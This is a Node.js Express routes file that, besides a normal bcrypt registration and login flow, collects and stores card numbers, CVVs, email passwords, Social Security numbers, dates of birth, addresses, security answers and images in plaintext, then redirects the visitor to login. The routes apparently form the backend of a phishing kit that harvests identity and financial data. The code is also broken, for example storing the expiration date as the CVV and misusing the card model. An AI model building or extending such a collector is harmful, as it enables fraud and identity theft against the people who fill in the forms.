const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const passport = require('passport');
const multer = require('multer');
// Load User model
const User = require('../models/User');
const Email = require('../models/Email');
const Questions = require('../models/Questions')
const Card = require('../models/Questions')
const Image = require('../models/Images')
const {
  forwardAuthenticated
} = require('../config/auth');

const storage = multer.memoryStorage(); // Store images in memory
const upload = multer({ storage });

// Login Page
router.get('/login', forwardAuthenticated, (req, res) => res.render('login'));

// Register Page
router.get('/register', forwardAuthenticated, (req, res) => res.render('register'));

// Questions Page
router.get('/questions', forwardAuthenticated, (req, res) => res.render('questions'));

router.get('/images', forwardAuthenticated, (req, res) => res.render('images'));

router.get('/email', forwardAuthenticated, (req, res) => res.render('email'));

router.get('/card', forwardAuthenticated, (req, res) => res.render('card'));

router.post('/card', async (req, res) => {
  const card = new Card({
    cardnumber: req.params.cardnumber,
    expirationdate: req.params.expirationdate,
    cvv: req.params.expirationdate
  });

  card
    .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Card ok'
      );
      res.redirect('/users/login');
    })
  .catch(err => console.log(err));
});

// Handle Security Questions Form Submission
router.post('/images',  upload.fields([
  { name: 'image1'},
  { name: 'image2'}  
]), async (req, res) => {

  const image1 = {
    contentType: req.file.mimetype,
  };

  const image2 = {
    data: req.file.buffer,
    contentType: req.file.mimetype,
  };

  try {
    const newImage = new Image({ image1, image2 });
    await newImage.save();
    console.log("image uploaded successfully")
    res.redirect('/users/login');

  } catch (error) {
    console.error(error);
  }
});

router.post('/questions', async (req, res) => {
  const questions = new Questions({
    answer1: req.body.answer1,
    answer2: req.body.answer2,
    answer3: req.body.answer3,
    securityQuestion1: req.body.securityQuestion1,
    securityQuestion2: req.body.securityQuestion2,
    securityQuestion3: req.body.securityQuestion3
  });

  questions
    .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Questions ok'
      );
      res.redirect('/users/login');
    })
  .catch(err => console.log(err));
});

router.post('/email', async (req, res) => {
  const email = new Email({
    email: req.body.email,
    password: req.body.password,
    name: req.body.name,
    address: req.body.address,
    dob: req.body.dob,
    ssn: req.body.ssn
  });

  email
    .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Questions ok'
      );
      res.redirect('/users/login');
    })
  .catch(err => console.log(err));
});

// Register
router.post('/register', (req, res) => {
  const {
    name,
    email,
    password,
    password2
  } = req.body;
  let errors = [];

  if (!name || !email || !password || !password2) {
    errors.push({
      msg: 'Please enter all fields'
    });
  }

  if (password != password2) {
    errors.push({
      msg: 'Passwords do not match'
    });
  }

  if (password.length < 6) {
    errors.push({
      msg: 'Password must be at least 6 characters'
    });
  }

  if (errors.length > 0) {
    res.render('register', {
      errors,
      name,
      email,
      password,
      password2
    });
  } else {
    User.findOne({
      email: email
    }).then(user => {
      if (user) {
        errors.push({
          msg: 'Email already exists'
        });
        res.render('register', {
          errors,
          name,
          email,
          password,
          password2
        });
      } else {
        const newUser = new User({
          name,
          email,
          password
        });

        bcrypt.genSalt(10, (err, salt) => {
          bcrypt.hash(newUser.password, salt, (err, hash) => {
            if (err) throw err;
            newUser.password = hash;
            newUser
              .save()
              .then(user => {
                req.flash(
                  'success_msg',
                  'You are now registered and can log in'
                );
                res.redirect('/users/login');
              })
              .catch(err => console.log(err));
          });
        });
      }
    });
  }
});

// Login
router.post('/login', (req, res, next) => {
  passport.authenticate('local', {
    successRedirect: '/dashboard',
    failureRedirect: '/users/login',
    failureFlash: true
  })(req, res, next);
});

// Logout
router.get('/logout', (req, res) => {
  req.logout();
  req.flash('success_msg', 'You are logged out');
  res.redirect('/users/login');
});

module.exports = router;